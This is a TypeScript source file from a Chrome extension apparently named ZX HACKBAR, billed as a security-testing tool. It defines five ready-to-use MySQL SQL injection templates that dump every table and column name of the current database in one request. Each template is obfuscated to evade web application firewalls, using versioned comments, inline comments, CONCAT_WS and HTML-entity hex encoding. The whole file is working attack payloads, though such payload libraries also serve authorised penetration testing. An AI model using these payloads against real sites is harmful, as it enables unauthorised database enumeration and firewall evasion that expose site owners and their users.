/**
 * ZX HACKBAR — Security Testing & HTTP Inspection Chrome Extension
 * 
 * @module WafBasedLocalDios
 * @author Zone Xploiter / ZXMarchia
 * @license MIT
 * @description WAF-Evasion Local database schema Dump In One Shot templates.
 */

import { BuilderSubcategory, BuilderTemplate } from '../../types';

export const localDiosTemplates: BuilderTemplate[] = [
  {
    id: 'waf-local-dios-version-comment',
    name: 'Local DIOS Version Comment WAF',
    description: 'WAF bypass local DIOS using version comments /*!50000...*/',
    content: '(/*!50000SELECT*//*!50000GROUP_CONCAT(table_name,0x3a,column_name+SEPARATOR+0x3c62723e)*//*!50000FROM*//**/information_schema.columns/**/WHERE/**/table_schema=database())'
  },
  {
    id: 'waf-local-dios-inline-comment',
    name: 'Local DIOS Inline Comment (/**/)',
    description: 'WAF bypass local schema extraction using inline comments /**/',
    content: '(SELECT/**/GROUP_CONCAT(table_name,0x3a,column_name/**/SEPARATOR/**/0x3c62723e)/**/FROM/**/information_schema.columns/**/WHERE/**/table_schema=database())'
  },
  {
    id: 'waf-local-dios-concat-ws',
    name: 'Local DIOS concat_ws() WAF',
    description: 'WAF bypass local DIOS using CONCAT_WS with comment delimiters',
    content: '(/*!50000SELECT*//*!50000GROUP_CONCAT*/(CONCAT_WS(0x3a,table_name,column_name)+SEPARATOR+0x3c62723e)/*!50000FROM*//**/information_schema.columns/**/WHERE/**/table_schema=database())'
  },
  {
    id: 'waf-local-dios-tables-only',
    name: 'Local Tables Only WAF',
    description: 'WAF bypass local table names extraction from information_schema.tables',
    content: '(/*!50000SELECT*//*!50000GROUP_CONCAT(table_name+SEPARATOR+0x3c62723e)*//*!50000FROM*//**/information_schema.tables/**/WHERE/**/table_schema=database())'
  },
  {
    id: 'waf-local-dios-html-entity',
    name: 'Local DIOS HTML Entity Hex',
    description: 'HTML entity hex encoded local DIOS payload for bypassing WAF filters',
    content: '&#x28;&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x20;&#x47;&#x52;&#x4f;&#x55;&#x50;&#x5f;&#x43;&#x4f;&#x4e;&#x43;&#x41;&#x54;&#x28;&#x74;&#x61;&#x62;&#x6c;&#x65;&#x5f;&#x6e;&#x61;&#x6d;&#x65;&#x2c;&#x30;&#x78;&#x33;&#x61;&#x2c;&#x63;&#x6f;&#x6c;&#x75;&#x6d;&#x6e;&#x5f;&#x6e;&#x61;&#x6d;&#x65;&#x29;&#x20;&#x46;&#x52;&#x4f;&#x4d;&#x20;&#x69;&#x6e;&#x66;&#x6f;&#x72;&#x6d;&#x61;&#x74;&#x69;&#x6f;&#x6e;&#x5f;&#x73;&#x63;&#x68;&#x65;&#x6d;&#x61;&#x2e;&#x63;&#x6f;&#x6c;&#x75;&#x6d;&#x6e;&#x73;&#x20;&#x57;&#x48;&#x45;&#x52;&#x45;&#x20;&#x74;&#x61;&#x62;&#x6c;&#x65;&#x5f;&#x73;&#x63;&#x68;&#x65;&#x6d;&#x61;&#x3d;&#x64;&#x61;&#x74;&#x61;&#x62;&#x61;&#x73;&#x65;&#x28;&#x29;&#x29;'
  }
];

export const localDiosSubcategory: BuilderSubcategory = {
  id: 'local-dios',
  label: 'Local Dios',
  description: 'WAF bypass local schema dump in one shot templates filtered by database()',
  templates: localDiosTemplates
};
